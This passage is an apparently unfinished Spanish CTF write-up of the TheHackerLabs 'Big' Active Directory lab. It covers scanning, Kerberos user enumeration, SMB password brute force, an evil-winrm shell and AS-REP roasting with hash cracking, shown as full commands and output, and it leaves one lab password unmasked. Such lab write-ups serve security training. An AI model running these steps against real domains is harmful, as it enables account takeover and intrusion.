@@ -1,0 +1,1066 @@
+---
+layout: single
+title: Big - TheHackerLabs
+excerpt: "."
+date: 2025-04-17
+classes: wide
+header:
+  teaser: /assets/images/THL-writeup-big/_logo.png
+  teaser_home_page: true
+  icon: /assets/images/thehackerlabs.jpeg
+categories:
+  - TheHackerLabs
+  - Hard Machine
+tags:
+  - Windows
+  - Active Directory
+  - 
+  - 
+  - 
+  - 
+  - 
+  - 
+  - 
+  - OSCP Style
+---
+![](/assets/images/THL-writeup-big/_logo.png)
+
+texto
+
+Herramientas utilizadas:
+* *ping*
+* *nmap*
+* *arp-scan*
+* *wappalizer*
+* *wfuzz*
+* *gobuster*
+* **
+* **
+* **
+* **
+* **
+* **
+* **
+* **
+* **
+* **
+* **
+* **
+* **
+
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#fuzz">Fuzzing</a></li>
+				<li><a href="#directorios">Analizando Directorios Web Encontrados</a></li>
+				<li><a href="#Kerbrute">Enumeración de Usuarios con Kerbrute</a></li>
+				<li><a href="#ImagenesBig">Analizando Imágenes Encontradas en Directorio</a></li>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#FuerzaBruta">Aplicando Fuerza Bruta a Servicio SMB</a></li>
+				<li><a href="#AS-REP">Aplicando AS-REP Roasting Attack</a></li>
+				<li><a href="#Extracción">Extrayendo Archivo Oculto de una Imagen</a></li>
+				<ul>
+					<li><a href="#wordlists">Creando Wordlist con las Letras de Canciones Encontradas Convirtiendo Oraciones en Hash MD5</a></li>
+					<li><a href="#stegcracker">Crackeando Imágenes con stegcracker</a></li>
+					<li><a href="#stageseek">Crackeando Imágenes con stegseek</a></li>
+				</ul>
+				<li><a href="#ComprobandoContraseña">Obteniendo Archivo Original con steghide y Aplicando Password Spraying con Nueva Contraseña</a></li>
+			</ul>
+		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#"></a></li>
+				<li><a href="#"></a></li>
+				<li><a href="#"></a></li>
+			</ul>
+		<li><a href="#Links">Links de Investigación</a></li>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+</div>
+<br>
+
+
+<h2 id="Hosts">Descubrimiento de Hosts</h2>
+
+Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.
+
+Lo haremos primero con **nmap**:
+```bash
+nmap -sn 192.168.212.0/24
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 12:31 CST
+...
+Nmap scan report for 192.168.212.4
+Host is up (0.0012s latency).
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+...
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.23 seconds
+```
+
+Vamos a probar la herramienta **arp-scan**:
+```bash
+arp-scan -I eth0 -g 192.168.212.0/24
+Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+...
+192.168.212.4	XX	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.173 seconds (117.81 hosts/sec). 3 responded
+```
+Encontramos nuestro objetivo y es: `192.168.212.4`.
+
+<br>
+
+<h2 id="Ping">Traza ICMP</h2>
+
+Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
+```bash
+ping -c 4 192.168.212.4
+PING 192.168.212.4 (192.168.212.4) 56(84) bytes of data.
+64 bytes from 192.168.212.4: icmp_seq=1 ttl=128 time=1.11 ms
+64 bytes from 192.168.212.4: icmp_seq=2 ttl=128 time=0.796 ms
+64 bytes from 192.168.212.4: icmp_seq=3 ttl=128 time=2.37 ms
+64 bytes from 192.168.212.4: icmp_seq=4 ttl=128 time=1.22 ms
+
+--- 192.168.212.4 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3045ms
+rtt min/avg/max/mdev = 0.796/1.375/2.372/0.596 ms
+```
+Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.
+
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.212.4 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 12:37 CST
+Initiating ARP Ping Scan at 12:37
+Scanning 192.168.212.4 [1 port]
+Completed ARP Ping Scan at 12:37, 0.07s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 12:37
+Scanning 192.168.212.4 [65535 ports]
+Discovered open port 135/tcp on 192.168.212.4
+Discovered open port 80/tcp on 192.168.212.4
+Discovered open port 53/tcp on 192.168.212.4
+Discovered open port 139/tcp on 192.168.212.4
+Discovered open port 445/tcp on 192.168.212.4
+Discovered open port 47001/tcp on 192.168.212.4
+Discovered open port 49666/tcp on 192.168.212.4
+Discovered open port 88/tcp on 192.168.212.4
+Discovered open port 49686/tcp on 192.168.212.4
+Discovered open port 49673/tcp on 192.168.212.4
+Discovered open port 49665/tcp on 192.168.212.4
+Discovered open port 49669/tcp on 192.168.212.4
+Discovered open port 49676/tcp on 192.168.212.4
+Discovered open port 9389/tcp on 192.168.212.4
+Discovered open port 3269/tcp on 192.168.212.4
+Discovered open port 49670/tcp on 192.168.212.4
+Discovered open port 593/tcp on 192.168.212.4
+Discovered open port 49667/tcp on 192.168.212.4
+Increasing send delay for 192.168.212.4 from 0 to 5 due to max_successful_tryno increase to 4
+Discovered open port 49671/tcp on 192.168.212.4
+Discovered open port 5985/tcp on 192.168.212.4
+Discovered open port 3268/tcp on 192.168.212.4
+Discovered open port 49708/tcp on 192.168.212.4
+Discovered open port 389/tcp on 192.168.212.4
+Discovered open port 49664/tcp on 192.168.212.4
+Discovered open port 636/tcp on 192.168.212.4
+Discovered open port 464/tcp on 192.168.212.4
+Increasing send delay for 192.168.212.4 from 5 to 10 due to max_successful_tryno increase to 5
+Completed SYN Stealth Scan at 12:38, 62.04s elapsed (65535 total ports)
+Nmap scan report for 192.168.212.4
+Host is up, received arp-response (0.0021s latency).
+Scanned at 2025-04-17 12:37:55 CST for 62s
+Not shown: 65509 closed tcp ports (reset)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 128
+80/tcp    open  http             syn-ack ttl 128
+88/tcp    open  kerberos-sec     syn-ack ttl 128
+135/tcp   open  msrpc            syn-ack ttl 128
+139/tcp   open  netbios-ssn      syn-ack ttl 128
+389/tcp   open  ldap             syn-ack ttl 128
+445/tcp   open  microsoft-ds     syn-ack ttl 128
+464/tcp   open  kpasswd5         syn-ack ttl 128
+593/tcp   open  http-rpc-epmap   syn-ack ttl 128
+636/tcp   open  ldapssl          syn-ack ttl 128
+3268/tcp  open  globalcatLDAP    syn-ack ttl 128
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
+5985/tcp  open  wsman            syn-ack ttl 128
+9389/tcp  open  adws             syn-ack ttl 128
+47001/tcp open  winrm            syn-ack ttl 128
+49664/tcp open  unknown          syn-ack ttl 128
+49665/tcp open  unknown          syn-ack ttl 128
+49666/tcp open  unknown          syn-ack ttl 128
+49667/tcp open  unknown          syn-ack ttl 128
+49669/tcp open  unknown          syn-ack ttl 128
+49670/tcp open  unknown          syn-ack ttl 128
+49671/tcp open  unknown          syn-ack ttl 128
+49673/tcp open  unknown          syn-ack ttl 128
+49676/tcp open  unknown          syn-ack ttl 128
+49686/tcp open  unknown          syn-ack ttl 128
+49708/tcp open  unknown          syn-ack ttl 128
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 62.27 seconds
+           Raw packets sent: 270962 (11.922MB) | Rcvd: 65540 (2.622MB)
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
+
+Son muchos puertos y varios están relacionados con **Active Directory** como el **puerto 88** que es el **protocolo Kerberos**.
+
+<br>
+
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
+```bash
+nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49686,49708 192.168.212.4 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 12:39 CST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.212.4
+Host is up (0.0017s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-17 19:39:36Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  msrpc         Microsoft Windows RPC
+49708/tcp open  msrpc         Microsoft Windows RPC
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 59m58s
+| smb2-time: 
+|   date: 2025-04-17T19:40:31
+|_  start_date: 2025-04-17T19:28:41
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_nbstat: NetBIOS name: BIG, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.72 seconds
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+Muy bien, tenemos bastante información.
+
+Para empezar, el **servicio LDAP** nos dio el dominio que esta ocupando el **AD**, siendo **bbr.thl**. Registralo en el `/etc/hosts`.
+
+Vemos que tiene una página web activa en el **puerto 80**, y también parece estar activo el **servicio WinRM** en el **puerto 5985**.
+
+Y por último, parece que el **servicio SMB** necesita credenciales validas para poder listar los recursos compartidos.
+
+Con todo esto visto, vamos a empezar por la página web y luego por el **servicio Kerberos**.
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+</div>
+<br>
+
+
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
+
+Entremos:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura1.png">
+</p>
+
+Parece solo una página que muestra una imagen.
+
+Veamos qué nos dice **Wappalizer**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura2.png">
+</p>
+
+No nos muestra mucho.
+
+Si vemos el código fuente, solamente veremos un comentario extraño y un pequeño texto:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura3.png">
+</p>
+
+De ahí en fuera, no veo nada más, así que vamos a aplicar **Fuzzing** para ver si hay algo oculto por ahí.
+
+<br>
+
+<h2 id="fuzz">Fuzzing</h2>
+
+```bash
+wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt http://192.168.212.4/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.212.4/FUZZ
+Total requests: 1185240
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+=====================================================================
+
+000000002:   301        1 L      10 W       151 Ch      "images"                                                                                                                     
+000000635:   301        1 L      10 W       153 Ch      "contents"                                                                                                                   
+000036871:   200        21 L     41 W       435 Ch      "http://192.168.212.4/"                                                                                                      
+000005751:   301        1 L      10 W       150 Ch      "songs"                                                                                                                      
+000941761:   200        21 L     41 W       435 Ch      "%5c"                                                                                                                        
+...
+...
+
+Total time: 0
+Processed Requests: 1185240
+Filtered Requests: 1185213
+Requests/sec.: 0
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-c*       | Para ver el resultado en un formato colorido. |
+| *--hc*     | Para no mostrar un código de estado en los resultados. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+
+<br>
+
+Ahora probemos con **gobuster**:
+```bash
+gobuster dir -u http://192.168.212.4/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 100
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.212.4/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 151] [--> http://192.168.212.4/images/]
+/contents             (Status: 301) [Size: 153] [--> http://192.168.212.4/contents/]
+/songs                (Status: 301) [Size: 150] [--> http://192.168.212.4/songs/]
+...
+Progress: 1185240 / 1185241 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-u*       | Para indicar la URL a utilizar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+
+<br>
+
+Encontramos 3 directorios con ambas herramientas. Investiguemos que contienen.
+
+<br>
+
+<h2 id="directorios">Analizando Directorios Web Encontrados</h2>
+
+Si entramos en el directorio `/images`, solo encontraremos 4 imagenes y un archivo web.config que no contiene nada:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura4.png">
+</p>
+
+Lo primero que se puede notar, es que cada imagen tiene un peso más alto que otras y cada imagen es distinta.
+
+<br>
+
+Si entramos en el directorio `/contents`, encontraremos solamente un archivo de texto:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura5.png">
+</p>
+
+Entrando en el archivo, veremos que es un mensaje:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura6.png">
+</p>
+
+Nos están dando una pista, ya que el mensaje menciona que se escondieron llaves en **MD5**. Además, parece que tenemos un usuario llamado **music**.
+
+<br>
+
+Si entramos en el directorio `/songs`, encontraremos varios archivos de texto que parecen ser canciones:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura7.png">
+</p>
+
+Revisando cada archivo, confirmamos que son canciones a excepción del **archivo Skyisthelimit.txt** que parece ser un wordlist de contraseñas:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura8.png">
+</p>
+
+Quizá es parte de la máquina este wordlist.
+
+Por ahora, ya tenemos algunas pistas sobre lo que podemos hacer para avanzar con la máquina. Pero, primero vamos a comprobar los usuarios existentes en el **servicio Kerberos**.
+
+<br>
+
+<h2 id="Kerbrute">Enumeración de Usuarios con Kerbrute</h2>
+
+Por ahora, tenemos al menos un usuario posible que encontramos en el directorio `/contents`. Podría ser que otro usuario sea **big**, ya que el escaneo de servicios menciona que es el nombre de la máquina.
+Además, encontramos muchas referencias a este artista, así que es muy probable que sea otro usuario.
+
+Vamos a comprobar si estamos en lo correcto utilizando la herramienta **Kerbrute**.
+
+Puedes obtenerlo aquí:
+* <a href="https://github.com/ropnop/kerbrute" target="_blank">Repositorio de ropnop: kerbrute</a>
+
+Mete esos dos usuarios en un archivo de texto para utilizarlo con **kerbrute**:
+```bash
+./kerbrute_linux_amd64 userenum -d bbr.thl --dc 192.168.212.4 posiblesUsuarios.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 04/17/25 - Ronnie Flathers @ropnop
+
+2025/04/17 15:54:23 >  Using KDC(s):
+2025/04/17 15:54:23 >  	192.168.212.4:88
+
+2025/04/17 15:54:23 >  [+] VALID USERNAME:	 big@bbr.thl
+2025/04/17 15:54:23 >  [+] VALID USERNAME:	 music@bbr.thl
+2025/04/17 15:54:23 >  Done! Tested 2 usernames (2 valid) in 0.029 seconds
+```
+Excelente, si existen estos dos usuarios.
+
+Pero quizá existan más, por lo que haremos de nuevo el escaneo y usaremos el wordlists **xat-net-10-million-usernames.txt**:
+```bash
+./kerbrute_linux_amd64 userenum -d bbr.thl --dc 192.168.212.4 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 04/17/25 - Ronnie Flathers @ropnop
+
+2025/04/17 13:08:15 >  Using KDC(s):
+2025/04/17 13:08:15 >  	192.168.212.4:88
+
+2025/04/17 13:08:15 >  [+] VALID USERNAME:	 big@bbr.thl
+2025/04/17 13:08:16 >  [+] VALID USERNAME:	 song@bbr.thl
+2025/04/17 13:08:17 >  [+] VALID USERNAME:	 music@bbr.thl
+2025/04/17 13:08:18 >  [+] VALID USERNAME:	 administrator@bbr.thl
+2025/04/17 13:08:37 >  [+] VALID USERNAME:	 Administrator@bbr.thl
+2025/04/17 13:08:49 >  [+] VALID USERNAME:	 BIG@bbr.thl
+2025/04/17 13:08:53 >  [+] VALID USERNAME:	 Music@bbr.thl
+2025/04/17 13:09:29 >  [+] VALID USERNAME:	 Big@bbr.thl
+2025/04/17 13:11:28 >  [+] VALID USERNAME:	 Song@bbr.thl
+```
+El escaneo duro un rato, pero solamente encontro estos usuarios que solamente agrega al **usuario song y administrator**.
+
+<br>
+
+<h2 id="ImagenesBig">Analizando Imagenes Encontradas en Directorio</h2>
+
+De acuerdo al mensaje que encontramos en el directorio `/content`, puede que alguna imagen contenga un hash MD5 oculto.
+
+Vamos a descargar las imágenes y luego vamos a analizar cada una para ver que podemos encontrar.
+
+Descarguemos todas las imágenes con **wget**:
+```bash
+wget -r -l1 -nd -A jpg http://192.168.212.4/images/
+
+--2025-04-17 13:29:01--  http://192.168.212.4/images/
+Conectando con 192.168.212.4:80... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 563 [text/html]
+...
+...
+--2025-04-17 13:29:01--  http://192.168.212.4/images/big1.jpg
+Reutilizando la conexión con 192.168.212.4:80.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 53019 (52K) [image/jpeg]
+Grabando a: «big1.jpg»
+
+big1.jpg   100%[=====================>]  51.78K  --.-KB/s    en 0.02s   
+
+2025-04-17 13:29:01 (3.11 MB/s) - «big1.jpg» guardado [53019/53019]
+
+--2025-04-17 13:29:01--  http://192.168.212.4/images/big2.jpg
+Reutilizando la conexión con 192.168.212.4:80.
+Petición HTTP enviada, esperando respuesta... 200 OK
+...
+...
+...
+ACABADO --2025-04-17 13:29:01--
+Tiempo total de reloj: 0.1s
+Descargados: 6 ficheros, 649K en 0.06s (10.6 MB/s)
+```
+Listo, ya las tenemos todas.
+
+Para el análisis, utilizaremos las siguientes herramientas:
+* file
+* strings
+* exiftool
+
+Veamos qué nos muestra **file**:
+```bash
+file big1.jpg
+big1.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 1920x1080, components 3
+
+file big2.jpg
+big2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1191x670, components 3
+
+file big3.jpg
+big3.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1024x768, components 3
+
+file big4.jpg
+big4.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1280x800, components 3
+```
+Parecen ser imágenes simples.
+
+
+Lo curioso empieza cuando vemos las imágenes con **strings**, pues con **big2.jpg** parece que muestra un hash:
+```bash
+strings big2.jpg | head -n 10
+JFIF
+ $.' ",#
+(7),01444
+'9=82<.342
+!22222222222222222222222222222222222222222222222222
+$3br
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+	#3R
+&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+<JYC6
+```
+Pero no resulta ser nada.
+
+Y con **exiftool** tampoco muestra algo.
+
+Investigando un poco sobre **"como encontrar data oculta en imágenes"**, encontre el siguiente blog:
+* <a href="https://infosecwriteups.com/beginners-ctf-guide-finding-hidden-data-in-images-e3be9e34ae0d" target="_blank">Beginners CTF Guide: Finding Hidden Data in Images</a>
+
+Al final menciona sobre el tema de **Estenografía**. Investiguemos que es esto.
+
+| **Estenografía** |
+|:-----------:|
+| *La esteganografía es la práctica de ocultar información dentro de otro mensaje u objeto físico para evitar su detección. Se puede usar para ocultar casi cualquier tipo de contenido digital, ya sea texto, imágenes, videos o audios. Luego, dichos datos ocultos se extraen en destino.* |
+
+<br>
+
+Además, menciona unas herramientas que podemos utilizar, pero esas herramientas no nos ayudaran, ya que están obsoletas, así que de momento, pasemos a revisar otras cosas.
+
+Recordando que tenemos usuarios validos y un wordlist de contraseña que encontramos en la página web, podemos aplicar **Fuerza Bruta** y quizá el **ASREP-Roasting Attack**.
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+</div>
+<br>
+
+
+<h2 id="FuerzaBruta">Aplicando Fuerza Bruta a Servicio Kerberos</h2>
+
+Vamos a descargar el wordlist de contraseñas que esta en la página web con **wget**:
+```bash
+wget http://192.168.212.4/songs/Skyisthelimit.txt
+--2025-04-17 12:50:50--  http://192.168.212.4/songs/Skyisthelimit.txt
+Conectando con 192.168.212.4:80... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 1793 (1.8K) [text/plain]
+Grabando a: «Skyisthelimit.txt»
+
+Skyisthelimit.txt      100%[=================>]   1.75K  --.-KB/s    en 0s      
+
+2025-04-17 12:50:51 (225 MB/s) - «Skyisthelimit.txt» guardado [1793/1793]
+```
+
+Y con **crackmapexec**, vamos a aplicar fuerza bruta al **servicio SMB** y utilizaremos un pequeño filtro para que nos muestre los resultados validos:
+```bash
+crackmapexec smb 192.168.212.4 -u usuarios.txt -p Skyisthelimit.txt --continue-on-success | grep "[+]"
+SMB                      192.168.212.4   445    BIG              [+] bbr.thl\song:******
+```
+
+Muy bien, tenemos la contraseña del **usuario song** y si recordamos el escaneo de servicios, esta activo el **servicio WinRM**, por lo que podemos probar si estas credenciales sirven para ese servicio:
+```bash
+crackmapexec winrm 192.168.212.4 -u 'song' -p '******'
+SMB         192.168.212.4   5985   BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
+HTTP        192.168.212.4   5985   BIG              [*] http://192.168.212.4:5985/wsman
+WINRM       192.168.212.4   5985   BIG              [+] bbr.thl\song:****** (Pwn3d!)
+```
+Excelente, podemos conectarnos a la máquina víctima con **evil-winrm**.
+
+Hagámoslo:
+```bash
+evil-winrm -i 192.168.212.4 -u 'song' -p '******'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\TEMP\Documents> whoami
+bbr\song
+```
+Estamos dentro.
+
+<br>
+
+<h2 id="AS-REP">Aplicando AS-REP Roasting Attack</h2>
+
+Como ya tenemos una lista de usuarios validos, podemos aplicar el **AS-REP Roasting Attack**, con tal de confirmar si algún usuario tiene la flag **UF_DONT_REQUIRE_PREAUTH** y así capturar el **hash krb5asrep** que contiene la contraseña del usuario con esta flag.
+
+Lo haremos con la herramienta **impacket-GetNPUsers**:
+```bash
+impacket-GetNPUsers -no-pass -usersfile usuarios.txt bbr.thl/
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User big doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$song@BBR.THL:03ca8e428eb7f65eed7f026ca8332ca6$ae9da9376d85f2f338e8...
+[-] User music doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+Genial, el **usuario song** tiene activa esta flag.
+
+Ahora, tenemos que crackear este hash para encontrar la contraseña y lo haremos con **hashcat** y con **JohnTheRipper**.
+
+Como wordlist de contraseñas, usaremos el que encontramos en la página web.
+
+Primero, lo haremos con **JohnTheRipper**:
+```bash
+john -w:Skyisthelimit.txt ASREP-hash --format=krb5asrep
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Passwordsave@    ($krb5asrep$23$song@BBR.THL)     
+1g 0:00:00:00 DONE (2025-04-17 16:06) 33.33g/s 6700p/s 6700c/s 6700C/s 123456..qwerty123456
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+Ahora con **hashcat**:
+```bash
+hashcat -m 18200 -a 0 ASREP-hash Skyisthelimit.txt
+hashcat (v6.2.6) starting
+...
+...
+...
+...
+$krb5asrep$23$song@BBR.THL:03ca8e428eb7f65eed7f026ca8332ca6$ae9da9376d8....:******
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$song@BBR.THL:03ca8e428eb7f65eed7f026c...134458
+Time.Started.....: Thu Apr 17 16:06:52 2025 (0 secs)
+Time.Estimated...: Thu Apr 17 16:06:52 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (Skyisthelimit.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    56857 H/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 201/201 (100.00%)
